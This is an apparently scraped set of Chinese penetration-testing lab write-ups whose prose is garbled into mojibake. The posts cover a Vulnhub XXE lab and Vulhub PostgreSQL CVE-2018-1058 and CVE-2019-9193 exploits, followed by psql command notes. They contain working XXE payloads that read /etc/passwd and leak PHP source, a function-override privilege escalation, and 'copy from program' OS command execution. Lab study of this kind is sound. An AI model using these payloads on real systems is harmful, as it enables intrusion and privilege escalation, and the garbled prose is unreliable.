[{"title":"Vulnhub|XXE Lab","url":"/55575d9b.html","content":"0.é¶æœºå®‰è£…\nä¸å†èµ˜è¿°ï¼Œå¯çœ‹ä¹‹å‰çš„Vulnhubç›¸å…³æ–‡ç« ã€‚  \n\n1.ä¿¡æ¯æ”¶é›†\nâ”Œâ”€â”€(rootã‰¿kali)-[/var/logs]\nâ””â”€# nmap -A -p- 192.168.81.129        \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 21:07 CDT\nNmap scan report for 192.168.81.129\nHost is up (0.00052s latency).                                                                                    \nNot shown: 65533 closed tcp ports (reset)                                                                         \nPORT     STATE SERVICE VERSION                                                                                    \n80/tcp   open  http    Apache httpd 2.4.27 ((Ubuntu))                                                             \n| http-robots.txt: 2 disallowed entries                                                                           \n|_/xxe/* /admin.php                                                                                               \n|_http-title: Apache2 Ubuntu Default Page: It works                                                               \n|_http-server-header: Apache/2.4.27 (Ubuntu)                                                                      \n5355/tcp open  llmnr?                                                                                             \nMAC Address: 00:0C:29:55:D1:56 (VMware)                                                                           \nDevice type: general purpose                                                                                      \nRunning: Linux 3.X|4.X                                                                                            \nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4                                                   \nOS details: Linux 3.2 - 4.9                                                                                       \nNetwork Distance: 1 hop                 \nrobots.txtè®°å½•äº†ä¸¤ä¸ªè·¯å¾„ï¼š/xxe/å’Œ/admin.phpã€‚è®¿é—®/admin.phpï¼Œå“åº”404ã€‚è®¿é—®/xxe/ï¼Œæ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œç”¨admin:adminç™»å½•ï¼ŒæŸ¥çœ‹è¯·æ±‚ï¼ŒPOSTæŠ¥æ–‡æ˜¯XMLä»£ç ï¼šPOST /xxe/xxe.php HTTP/1.1\nHost: 192.168.81.129\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: text/plain;charset=UTF-8\nContent-Length: 95\nOrigin: http://192.168.81.129\nDNT: 1\nConnection: close\nReferer: http://192.168.81.129/xxe/\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>&lt;root>&lt;name>admin&lt;/name>&lt;password>admin&lt;/password>&lt;/root>å°è¯•è¿›è¡ŒXXEï¼Œæ³¨æ„æ­¤å¤„è¯·æ±‚æŠ¥æ–‡æ ‡è®°ä¸­å‚æ•°å‰è¦åŠ ä¸Šä¸€ä¸ª&amp;ï¼šPOST /xxe/xxe.php HTTP/1.1\nHost: 192.168.81.129\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: text/plain;charset=UTF-8\nContent-Length: 189\nOrigin: http://192.168.81.129\nDNT: 1\nConnection: close\nReferer: http://192.168.81.129/xxe/\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n&lt;!DOCTYPE r [\n\n&lt;!ELEMENT r ANY>\n\n&lt;!ENTITY admin SYSTEM \"file:///etc/passwd\">\n\n]>\n&lt;root>&lt;name>&amp;admin;&lt;/name>&lt;password>admin&lt;/password>&lt;/root>æŸ¥çœ‹å“åº”ä½“ï¼Œæ³¨å…¥æˆåŠŸï¼šSorry, this root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\nsyslog:x:104:108::/home/syslog:/bin/false\nmessagebus:x:105:109::/var/run/dbus:/bin/false\n_apt:x:106:65534::/nonexistent:/bin/false\nuuidd:x:107:111::/run/uuidd:/bin/false\nr00t:x:1000:1000:Administrator,,,:/home/r00t:/bin/bash\nnot available!å°è¯•è¯»å–/admin.phpçš„å†…å®¹ï¼š  \n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n&lt;!DOCTYPE r [\n\n&lt;!ELEMENT r ANY>\n\n&lt;!ENTITY admin SYSTEM \"php://filter/read=convert.base64-encode/resource=admin.php\">\n\n]>\n&lt;root>&lt;name>&amp;admin;&lt;/name>&lt;password>admin&lt;/password>&lt;/root>\næŸ¥çœ‹å“åº”æŠ¥æ–‡ï¼Œå¾—åˆ°base64å½¢å¼çš„phpå†…å®¹ï¼Œè¿›è¡Œè§£ç ï¼š  //å®é™…æŠ¥æ–‡ï¼š\nSorry, this PD9waHAKICAgc2Vzc2lvbl9zdGFydCgpOwo/PgoKCjxodG1sIGxhbmcgPSAiZW4iPgogICAKICAgPGhlYWQ+CiAgICAgIDx0aXRsZT5hZG1pbjwvdGl0bGU+CiAgICAgIDxsaW5rIGhyZWYgPSAiY3NzL2Jvb3RzdHJhcC5taW4uY3NzIiByZWwgPSAic3R5bGVzaGVldCI+CiAgICAgIAogICAgICA8c3R5bGU+CiAgICAgICAgIGJvZHkgewogICAgICAgICAgICBwYWRkaW5nLXRvcDogNDBweDsKICAgICAgICAgICAgcGFkZGluZy1ib3R0b206IDQwcHg7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNBREFCQUI7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiB7CiAgICAgICAgICAgIG1heC13aWR0aDogMzMwcHg7CiAgICAgICAgICAgIHBhZGRpbmc6IDE1cHg7CiAgICAgICAgICAgIG1hcmdpbjogMCBhdXRvOwogICAgICAgICAgICBjb2xvcjogIzAxNzU3MjsKICAgICAgICAgfQogICAgICAgICAKICAgICAgICAgLmZvcm0tc2lnbmluIC5mb3JtLXNpZ25pbi1oZWFkaW5nLAogICAgICAgICAuZm9ybS1zaWduaW4gLmNoZWNrYm94IHsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgICAgfQogICAgICAgICAKICAgICAgICAgLmZvcm0tc2lnbmluIC5jaGVja2JveCB7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBub3JtYWw7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiAuZm9ybS1jb250cm9sIHsKICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgICAgIC13ZWJraXQtYm94LXNpemluZzogYm9yZGVyLWJveDsKICAgICAgICAgICAgLW1vei1ib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgICAgICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgICAgICBmb250LXNpemU6IDE2cHg7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiAuZm9ybS1jb250cm9sOmZvY3VzIHsKICAgICAgICAgICAgei1pbmRleDogMjsKICAgICAgICAgfQogICAgICAgICAKICAgICAgICAgLmZvcm0tc2lnbmluIGlucHV0W3R5cGU9ImVtYWlsIl0gewogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAtMXB4OwogICAgICAgICAgICBib3JkZXItYm90dG9tLXJpZ2h0LXJhZGl1czogMDsKICAgICAgICAgICAgYm9yZGVyLWJvdHRvbS1sZWZ0LXJhZGl1czogMDsKICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiMwMTc1NzI7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiBpbnB1dFt0eXBlPSJwYXNzd29yZCJdIHsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgICAgICAgYm9yZGVyLXRvcC1sZWZ0LXJhZGl1czogMDsKICAgICAgICAgICAgYm9yZGVyLXRvcC1yaWdodC1yYWRpdXM6IDA7CiAgICAgICAgICAgIGJvcmRlci1jb2xvcjojMDE3NTcyOwogICAgICAgICB9CiAgICAgICAgIAogICAgICAgICBoMnsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgICAgICBjb2xvcjogIzAxNzU3MjsKICAgICAgICAgfQogICAgICA8L3N0eWxlPgogICAgICAKICAgPC9oZWFkPgoJCiAgIDxib2R5PgogICAgICAKICAgICAgPGgyPkVudGVyIFVzZXJuYW1lIGFuZCBQYXNzd29yZDwvaDI+IAogICAgICA8ZGl2IGNsYXNzID0gImNvbnRhaW5lciBmb3JtLXNpZ25pbiI+CiAgICAgICAgIAogICAgICAgICA8P3BocAogICAgICAgICAgICAkbXNnID0gJyc7CiAgICAgICAgICAgIGlmIChpc3NldCgkX1BPU1RbJ2xvZ2luJ10pICYmICFlbXB0eSgkX1BPU1RbJ3VzZXJuYW1lJ10pIAogICAgICAgICAgICAgICAmJiAhZW1wdHkoJF9QT1NUWydwYXNzd29yZCddKSkgewoJCQkJCiAgICAgICAgICAgICAgIGlmICgkX1BPU1RbJ3VzZXJuYW1lJ10gPT0gJ2FkbWluaXN0aGViZXN0JyAmJiAKICAgICAgICAgICAgICAgICAgbWQ1KCRfUE9TVFsncGFzc3dvcmQnXSkgPT0gJ2U2ZTA2MTgzODg1NmJmNDdlMWRlNzMwNzE5ZmIyNjA5JykgewogICAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ3ZhbGlkJ10gPSB0cnVlOwogICAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ3RpbWVvdXQnXSA9IHRpbWUoKTsKICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWyd1c2VybmFtZSddID0gJ2FkbWluaXN0aGViZXN0JzsKICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBlY2hvICJZb3UgaGF2ZSBlbnRlcmVkIHZhbGlkIHVzZSBuYW1lIGFuZCBwYXNzd29yZCA8YnIgLz4iOwoJCSRmbGFnID0gIkhlcmUgaXMgdGhlIDxhIHN0eWxlPSdjb2xvcjpGRjAwMDA7JyBocmVmPScvZmxhZ21lb3V0LnBocCc+RmxhZzwvYT4iOwoJCWVjaG8gJGZsYWc7CiAgICAgICAgICAgICAgIH1lbHNlIHsKICAgICAgICAgICAgICAgICAgJG1zZyA9ICdNYXliZSBMYXRlcic7CiAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICA/PgogICAgICA8L2Rpdj4gPCEtLSBXMDB0L1cwMHQgLS0+CiAgICAgIAogICAgICA8ZGl2IGNsYXNzID0gImNvbnRhaW5lciI+CiAgICAgIAogICAgICAgICA8Zm9ybSBjbGFzcyA9ICJmb3JtLXNpZ25pbiIgcm9sZSA9ICJmb3JtIiAKICAgICAgICAgICAgYWN0aW9uID0gIjw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkX1NFUlZFUlsnUEhQX1NFTEYnXSk7IAogICAgICAgICAgICA/PiIgbWV0aG9kID0gInBvc3QiPgogICAgICAgICAgICA8aDQgY2xhc3MgPSAiZm9ybS1zaWduaW4taGVhZGluZyI+PD9waHAgZWNobyAkbXNnOyA/PjwvaDQ+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlID0gInRleHQiIGNsYXNzID0gImZvcm0tY29udHJvbCIgCiAgICAgICAgICAgICAgIG5hbWUgPSAidXNlcm5hbWUiIAogICAgICAgICAgICAgICByZXF1aXJlZCBhdXRvZm9jdXM+PC9icj4KICAgICAgICAgICAgPGlucHV0IHR5cGUgPSAicGFzc3dvcmQiIGNsYXNzID0gImZvcm0tY29udHJvbCIKICAgICAgICAgICAgICAgbmFtZSA9ICJwYXNzd29yZCIgcmVxdWlyZWQ+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3MgPSAiYnRuIGJ0bi1sZyBidG4tcHJpbWFyeSBidG4tYmxvY2siIHR5cGUgPSAic3VibWl0IiAKICAgICAgICAgICAgICAgbmFtZSA9ICJsb2dpbiI+TG9naW48L2J1dHRvbj4KICAgICAgICAgPC9mb3JtPgoJCQkKICAgICAgICAgQ2xpY2sgaGVyZSB0byBjbGVhbiA8YSBocmVmID0gImFkbWlubG9nLnBocCIgdGl0ZSA9ICJMb2dvdXQiPlNlc3Npb24uCiAgICAgICAgIAogICAgICA8L2Rpdj4gCiAgICAgIAogICA8L2JvZHk+CjwvaHRtbD4K not available!\n//è§£ç åï¼Œæ‰¾åˆ°å…³é”®ä¿¡æ¯ï¼š\n&lt;?php\n......\n              if ($_POST['username'] == 'administhebest' &amp;&amp; \n                 md5($_POST['password']) == 'e6e061838856bf47e1de730719fb2609') &#123;\n                 $_SESSION['valid'] = true;\n                 $_SESSION['timeout'] = time();\n                 $_SESSION['username'] = 'administhebest';\n                 \n               echo \"You have entered valid use name and password &lt;br />\";\n\t$flag = \"Here is the &lt;a style='color:FF0000;' href='/flagmeout.php'>Flag&lt;/a>\";\n\techo $flag;\n              &#125;else &#123;\n                 $msg = 'Maybe Later';\n              &#125;\n           &#125;\n        ?>\n\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulnhub","åŠ«æŒç¯å¢ƒå˜é‡ææƒ","FileUpload","XXE"]},{"title":"Vulhub|Zabbixé›†åˆ","url":"/7293a273.html","content":"0.é¶åœºæ­å»ºå‚è€ƒä½œè€…[jpSpaceX]å†™çš„æ–‡ç« https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Zabbix latest.php SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2016-10134ï¼‰å½±å“ç‰ˆæœ¬ : Zabbix 2.2.* 3.0.0-3.0.3Path : zabbix/CVE-2016-10134Vul : SQLæ³¨å…¥  \n\nBreakthrough\n\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Tools]\nâ””â”€# nmap 192.168.228.3 -A     \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 09:52 CST\nNmap scan report for 192.168.228.3\nHost is up (0.00036s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 e0:5e:a5:f0:6b:81:54:0b:54:b8:eb:69:2d:c8:77:49 (RSA)\n|   256 e9:7f:3c:a0:41:9c:d8:72:85:c7:7f:ee:13:b0:7a:e7 (ECDSA)\n|_  256 7d:cf:7e:fb:77:38:8a:d0:48:97:43:f3:be:fb:f9:8d (ED25519)\n8080/tcp open  http    Apache httpd 2.4.33 ((Unix))\n| http-robots.txt: 2 disallowed entries \n|_/ /zabbix/\".\n|_http-title: Zabbix\n| http-cookie-flags: \n|   /: \n|     zbx_sessionid: \n|       httponly flag not set\n|     PHPSESSID: \n|_      httponly flag not set\n| http-open-proxy: Potentially OPEN proxy.\n|_Methods supported:CONNECTION\n|_http-server-header: Apache/2.4.33 (Unix)\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulhub","Zabbix"]},{"title":"Vulhub|PostgreSQLé›†åˆ","url":"/44cd77ef.html","content":"0.é¶åœºæ­å»ºå‚è€ƒä½œè€…[jpSpaceX]å†™çš„æ–‡ç« https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.PostgreSQL ææƒæ¼æ´ï¼ˆCVE-2018-1058ï¼‰å½±å“ç‰ˆæœ¬ : PostgreSQL 9.3-10Path : postgres/CVE-2018-1058Vul : ææƒPostgreSQL  \n\n\nç›¸å…³è¯­æ³•å¯æŸ¥çœ‹SQL  \n\nå½“ç”¨æˆ·åˆ›å»ºæ•°æ®åº“åï¼Œé»˜è®¤æ“ä½œè®¾ç½®éƒ½æ˜¯åœ¨åä¸ºpublicçš„schemaä¸‹è¿›è¡Œçš„ã€‚ä»»ä½•ç”¨æˆ·å¯ä»¥åœ¨publicä¸‹åˆ›å»ºå¯¹è±¡(æ–°å»ºè¡¨ã€æ–°å»ºå‡½æ•°ç­‰æ“ä½œ)ã€‚PostSQLçš„search_pathé»˜è®¤å€¼ï¼š&quot;$user&quot;,public ï¼š$userå£°æ˜æœç´¢å’Œå½“å‰ç”¨æˆ·åŒåçš„schemaï¼ˆç¼ºçœï¼‰ã€‚å› ä¸ºè¿˜æ²¡æœ‰è¿™æ ·çš„æ¨¡å¼å­˜åœ¨ï¼Œæ‰€ä»¥è¿™æ¡è®°å½•è¢«å¿½ç•¥ã€‚publicæŒ‡å‘public schemaã€‚postgres=> SHOW search_path;\n  search_path   \n-----------------\n\"$user\", public\n(1 è¡Œè®°å½•)é™¤äº†publicå’Œç”¨æˆ·åˆ›å»ºçš„schemaä¹‹å¤–ï¼Œæ¯ä¸ªæ•°æ®åº“éƒ½åŒ…å«ä¸€ä¸ªpg_catalog schemaï¼Œå®ƒåŒ…å«ç³»ç»Ÿè¡¨å’Œæ‰€æœ‰å†…ç½®æ•°æ®ç±»å‹ã€å‡½æ•°ã€æ“ä½œç¬¦ã€‚pg_catalogæ€»æ˜¯search_pathä¸­çš„ä¸€éƒ¨åˆ†ã€‚å¦‚æœå®ƒæ²¡æœ‰æ˜ç¡®å‡ºç°åœ¨search_pathä¸­ï¼Œé‚£ä¹ˆå®ƒéšå«åœ°åœ¨æ‰€æœ‰search_pathä¹‹å‰æœç´¢ã€‚è¿™æ ·å°±ä¿è¯äº†å†…ç½®åå­—æ€»æ˜¯å¯ä»¥è¢«æœç´¢ã€‚  \n\n\nBreakthroughï¼šåœ¨public schemaä¸Šé‡è½½å‡½æ•°ï¼ŒåŠ å…¥æ¶æ„çš„ç¨‹åºä»£ç ã€‚ç­‰å¾…å…¶ä»–è´¦æˆ·ï¼Œå°¤å…¶æ˜¯é«˜æƒé™è´¦æˆ·è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œå°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ï¼ˆä»¥é«˜æƒé™æ‰§è¡Œï¼‰ä»è€Œè¾¾åˆ°è¿œç¨‹æ¶æ„ä»£ç æ‰§è¡Œçš„ç›®çš„ã€‚æŸ¥çœ‹å½“å‰postgresæ•°æ®åº“ç”¨æˆ·ï¼Œvulhubä¸å…·æœ‰superæƒé™ï¼špostgres=# SELECT rolname,rolsuper FROM pg_roles;\n     rolname      | rolsuper \n-------------------+----------\npg_signal_backend | f\npostgres          | t\nvulhub            | f\n(3 rows)\nä»¥ä½æƒé™ç”¨æˆ·vulhubåˆ›å»ºè¡¨T_vulhubï¼Œæ­¤æ—¶è¡¨é»˜è®¤åˆ›å»ºåœ¨publicé‡Œã€‚postgres=> create table T_vulhub as select 'vulhub'::varchar as contents;\nSELECT 1\npostgres=> \\d\n              å…³è”åˆ—è¡¨\næ¶æ„æ¨¡å¼ |   åç§°   |  ç±»å‹  | æ‹¥æœ‰è€… \n----------+----------+--------+--------\npublic   | t_vulhub | æ•°æ®è¡¨ | vulhub\n(1 è¡Œè®°å½•)ä»¥ä½æƒé™ç”¨æˆ·vulhubåˆ›å»ºå‡½æ•°upperï¼Œæ­¤æ—¶å‡½æ•°é»˜è®¤åˆ›å»ºåœ¨publicé‡Œã€‚postgres=> create function upper(varchar) returns text as $$\npostgres$> alter role vulhub superuser; //å°†vulhubçš„æƒé™æå‡è‡³superuser\npostgres$> select pg_catalog.upper($1);\npostgres$> $$ language sql volatile;\nCREATE FUNCTIONè‹¥æ­¤æ—¶ç”¨ésuperæƒé™çš„vulhubå»æ‰§è¡Œï¼Œåˆ™å±•ç¤ºæ‰§è¡Œå¤±è´¥ã€‚postgres=> select upper(contents) from T_vulhub;\nERROR:  must be superuser to alter superusers\nèƒŒæ™¯:  SQL function \"upper\" statement 1å½“å…·æœ‰superæƒé™çš„ç”¨æˆ·æ‰§è¡Œä¸Šè¿°å‡½æ•°upperæ—¶ï¼Œä¾¿ä¼šè§¦å‘å…¶ä¸­çš„æ¶æ„ææƒä»£ç ï¼Œä½æƒé™ç”¨æˆ·vulhubæˆåŠŸæè‡³superuseræƒé™ã€‚postgres=# select upper(contents) from T_vulhub;\nupper  \n--------\nVULHUB\n(1 row)\npostgres=# select rolname,rolsuper from pg_roles;\n     rolname      | rolsuper \n-------------------+----------\npg_signal_backend | f\npostgres          | t\nvulhub            | t\n(3 rows)Qï¼šä¸ºä»€ä¹ˆæ­¤å¤„ä¼˜å…ˆæ‰§è¡Œçš„æ˜¯publicä¸­çš„upper()ï¼Œè€Œä¸æ˜¯pg_catalogä¸­çš„upper()å‘¢ï¼Ÿpostgres=> \\df upper;\n                          å‡½æ•°åˆ—è¡¨\n æ¶æ„æ¨¡å¼  | åç§°  | ç»“æœæ•°æ®ç±»å‹ |   å‚æ•°æ•°æ®ç±»å‹    | ç±»å‹ \n------------+-------+--------------+-------------------+------\npg_catalog | upper | anyelement   | anyrange          | å‡½æ•°\npg_catalog | upper | text         | text              | å‡½æ•°\npublic     | upper | text         | character varying | å‡½æ•°\n(3 è¡Œè®°å½•)pg_catalog.upper()çš„å…¥å‚ç±»å‹æ˜¯textï¼Œpublic.upper()çš„å…¥å‚ç±»å‹æ˜¯varcharï¼Œæ‰§è¡Œè¯¥å‡½æ•°æ—¶ä¼ å…¥çš„å‚æ•°æ˜¯T_vulhub.contentsï¼Œæ˜¯varcharç±»å‹çš„ï¼Œä¸ºâ€˜æœ€ä½³åŒ¹é…â€™ã€‚  \n\n2.PostgreSQL é«˜æƒé™å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-9193ï¼‰å½±å“ç‰ˆæœ¬ : PostgreSQL 9.3-11.2Path : postgres/CVE-2019-9193Vul : ä»»æ„å‘½ä»¤æ‰§è¡ŒBreakthroughï¼š  \n\nä»9.3ç‰ˆæœ¬å¼€å§‹ï¼ŒPostgresæ–°å¢äº†ä¸€ä¸ª COPY TO/FROM PROGRAM åŠŸèƒ½ï¼Œå…è®¸æ•°æ®åº“çš„ è¶…çº§ç”¨æˆ· ä»¥åŠ pg_read_server_filesç»„ ä¸­çš„ä»»ä½•ç”¨æˆ·æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚åœ¨æ•°æ®åº“å»ºä¸€å¼ ç”¨äºå›æ˜¾ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œç»“æœçš„è¡¨ â€“&gt; åˆ©ç”¨copyå‡½æ•°å°†ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œç»“æœå¤åˆ¶åˆ°è¡¨ä¸­ï¼špostgres=# create table test(contents text);\nCREATE TABLE\npostgres=# \\dt test\n             å…³è”åˆ—è¡¨\næ¶æ„æ¨¡å¼ | åç§° |  ç±»å‹  |  æ‹¥æœ‰è€…  \n----------+------+--------+----------\npublic   | test | æ•°æ®è¡¨ | postgres\n(1 è¡Œè®°å½•)\npostgres=# copy test from program 'id';\nCOPY 1\npostgres=# select * from test;\n                               contents                                \n------------------------------------------------------------------------\nuid=999(postgres) gid=999(postgres) groups=999(postgres),103(ssl-cert)\n(1 è¡Œè®°å½•)\npostgres=# copy test from program 'cat /etc/passwd';\nCOPY 21\npostgres=# select * from test;\n                                    contents                                      \n-----------------------------------------------------------------------------------\nuid=999(postgres) gid=999(postgres) groups=999(postgres),103(ssl-cert)\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\npostgres:x:999:999::/var/lib/postgresql:/bin/bash\nDebian-exim:x:101:101::/var/spool/exim4:/bin/false\n(22 è¡Œè®°å½•)\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulhub","PostgreSQL"]},{"title":"SQL|å‘½ä»¤é›†åˆ","url":"/ffeb3adb.html","content":"PostgreSQL(:5432)ç™»å½•PostgreSQL\npsql --host &lt;ip> --username &lt;name>;\n\næŸ¥è¯¢æ•°æ®åº“åˆ—è¡¨\n\\list æˆ– \\l æˆ– \\list+ æˆ– \\l+ â€“+ï¼šæ‰©å±•vulhub=> \\l+\n                                                                     æ•°æ®åº“åˆ—è¡¨\n  åç§°   |  æ‹¥æœ‰è€…  | å­—å…ƒç¼–ç  |  æ ¡å¯¹è§„åˆ™  |   Ctype    |        å­˜å–æƒé™        |  å¤§å°   |   è¡¨ç©ºé—´    |                    æè¿°                    \n----------+---------+----------+-----------+------------+-----------------------+---------+------------+-------------------------------------------\npostgres | postgres | UTF8   | en_US.utf8 | en_US.utf8 |                       | 7063 kB | pg_default | default administrative connection database\ntemplate0| postgres | UTF8   | en_US.utf8 | en_US.utf8 | =c/postgres          +| 6953 kB | pg_default | unmodifiable empty database\n         |          |        |            |            | postgres=CTc/postgres |         |            | \ntemplate1| postgres | UTF8   | en_US.utf8 | en_US.utf8 | =c/postgres          +| 6953 kB | pg_default | default template for new databases\n         |          |        |            |            | postgres=CTc/postgres |         |            | \nvulhub   | vulhub   | UTF8   | en_US.utf8 | en_US.utf8 | =Tc/vulhub           +| 7103 kB | pg_default | \n         |          |        |            |            | vulhub=CTc/vulhub     |         |            | \n\nä½¿ç”¨æ•°æ®åº“\nvulhub=> \\c postgres\npsql (14.1 (Debian 14.1-4), æœåŠ¡å™¨ 9.6.7)\næ‚¨ç°åœ¨å·²ç»è¿æ¥åˆ°æ•°æ®åº“ \"postgres\",ç”¨æˆ· \"vulhub\".\n\næŸ¥è¯¢å½“å‰ç”¨æˆ·\n\\c æˆ– \\conninfo â€“åªé€‚ç”¨äºpsqlå‘½ä»¤select * from current_user; æˆ– select userpostgres=> \\conninfo  \nä»¥ç”¨æˆ· \"vulhub\" çš„èº«ä»½, åœ¨ä¸»æœº\"192.168.228.3\", ç«¯å£\"5432\"è¿æ¥åˆ°æ•°æ®åº“ \"postgres\"\npostgres=> select * from current_user;\ncurrent_user \n--------------\nvulhub\n(1 è¡Œè®°å½•)\n\næŸ¥è¯¢å½“å‰æ•°æ®åº“æ‰€æœ‰è¡¨\npostgres=# select * from pg_tables;\n    schemaname  |      tablename     | tableowner | tablespace | hasindexes | hasrules | hastriggers | rowsecurity \n--------------------+-------------------------+------------+------------+------------+----------+-------------+-----\npublic          | t_vulhub           | vulhub     |            | f          | f        | f           | f\npg_catalog      | pg_statistic       | postgres   |            | t          | f        | f           | f\n\næŸ¥è¯¢è¡¨ç»“æ„\npostgres=> \\dt T_vulhub;\n              å…³è”åˆ—è¡¨\næ¶æ„æ¨¡å¼ |   åç§°   |  ç±»å‹  | æ‹¥æœ‰è€… \n----------+----------+--------+--------\npublic   | t_vulhub | æ•°æ®è¡¨ | vulhub\n(1 è¡Œè®°å½•)\n\næŸ¥è¯¢å‡½æ•°ä¿¡æ¯\npostgres=> \\df upper;\n                          å‡½æ•°åˆ—è¡¨\n æ¶æ„æ¨¡å¼  | åç§°  | ç»“æœæ•°æ®ç±»å‹ |   å‚æ•°æ•°æ®ç±»å‹    | ç±»å‹ \n------------+-------+--------------+-------------------+------\npg_catalog | upper | anyelement   | anyrange          | å‡½æ•°\npg_catalog | upper | text         | text              | å‡½æ•°\npublic     | upper | text         | character varying | å‡½æ•°\n(3 è¡Œè®°å½•)\n\nç¬¦å·\n&#39;xxx&#39;::&lt;type&gt; ï¼š 